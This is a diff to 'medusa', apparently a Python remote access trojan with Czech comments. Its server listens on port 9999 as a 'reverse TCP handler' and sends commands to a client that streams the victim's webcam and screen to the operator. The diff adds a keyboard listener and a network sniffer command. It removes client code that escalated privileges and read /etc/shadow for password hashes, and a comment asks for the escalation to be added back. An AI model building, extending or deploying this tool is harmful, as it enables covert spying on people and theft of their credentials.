@@ -7,6 +7,7 @@ import cv2
 import numpy as np
 import signal
 import sys
+from pynput import keyboard  # Knihovna pro detekci kláves
 
 init(autoreset=True)
 
@@ -70,21 +71,17 @@ def handle_client(client_socket, addr):
         try:
             command = input(Fore.MAGENTA + "medusa > ")
         except EOFError:
-            # Handle CTRL+D
-            stop_server()
-            print(Fore.RED + "[ * ] Server stopped.")
-            continue
-        
-        if command == "CTRL+P":
-            stop_server()
-            print(Fore.RED + "[ * ] Server stopped.")
-            continue
-        
-        if command == "getsystem":
-            print(Fore.YELLOW + "[ * ] Attempting to escalate privileges...")
-        
+            break
+
         if command == "hashdump":
             print(Fore.YELLOW + "[ * ] Dumping password hashes...")
+        
+        if command == "sniffer_start":
+            print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
+        
+        if command == "CTRL+P":  # Tento příkaz již není třeba, klávesová zkratka to řeší
+            print(Fore.RED + "[ * ] Server will be stopped after CTRL+P")
+            continue
         
         client_socket.send(command.encode('utf-8'))
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
@@ -98,12 +95,32 @@ def stop_server():
         raise RuntimeError('Not running with the Werkzeug Server')
     func()
 
+# Funkce pro detekci stisknutí CTRL+P
+def on_press(key):
+    try:
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:  # Pokud je stisknutý CTRL
+            pass
+        if key.char == 'p' and keyboard.Listener._pressed[keyboard.Key.ctrl_l]:  # Pokud je stisknutý CTRL + P
+            print(Fore.RED + "[ * ] CTRL+P detected! Stopping server...")
+            stop_server()
+            return False  # Zastavit listener
+    except AttributeError:
+        pass
+
+def listen_for_ctrl_p():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()  # Bude čekat na stisknutí klávesy
+
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
     server_socket.listen(5)
     print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
     print(Fore.GREEN + "[ * ] Listening for incoming connections...")
+
+    # Spustit detekci CTRL+P v samostatném vlákně
+    keyboard_thread = threading.Thread(target=listen_for_ctrl_p)
+    keyboard_thread.start()
 
     while True:
         client_socket, addr = server_socket.accept()
@@ -113,40 +130,15 @@ def main():
 
 if __name__ == "__main__":
     main()
+
     
 #client
 
+#this is the client add here the functionality to escalate privileges                                                                                                                                      
 import socket
 import cv2
 import pyautogui
 import numpy as np
-import os
-import ctypes
-import subprocess
-
-def escalate_privileges():
-    try:
-        # Attempt to gain administrative privileges on Windows
-        if os.name == 'nt':
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        # Attempt to gain root privileges on Unix-like systems
-        elif os.name == 'posix':
-            os.system('sudo -s')
-        return True
-    except Exception as e:
-        print(f"Failed to escalate privileges: {e}")
-        return False
-
-def dump_password_hashes():
-    try:
-        if os.name == 'nt':
-            result = subprocess.run(['wmic', 'useraccount', 'get', 'name,sid'], capture_output=True, text=True)
-            return result.stdout
-        elif os.name == 'posix':
-            result = subprocess.run(['sudo', 'cat', '/etc/shadow'], capture_output=True, text=True)
-            return result.stdout
-    except Exception as e:
-        return f"Failed to dump password hashes: {e}"
 
 def webcam_stream(client_socket):
     cap = cv2.VideoCapture(0)
@@ -175,14 +167,6 @@ def main():
             webcam_stream(client_socket)
         elif command == "screen_stream":
             screen_stream(client_socket)
-        elif command == "getsystem":
-            if escalate_privileges():
-                client_socket.send("Privileges escalated".encode('utf-8'))
-            else:
-                client_socket.send("Failed to escalate privileges".encode('utf-8'))
-        elif command == "hashdump":
-            hashes = dump_password_hashes()
-            client_socket.send(hashes.encode('utf-8'))
 
 if __name__ == "__main__":
     main()
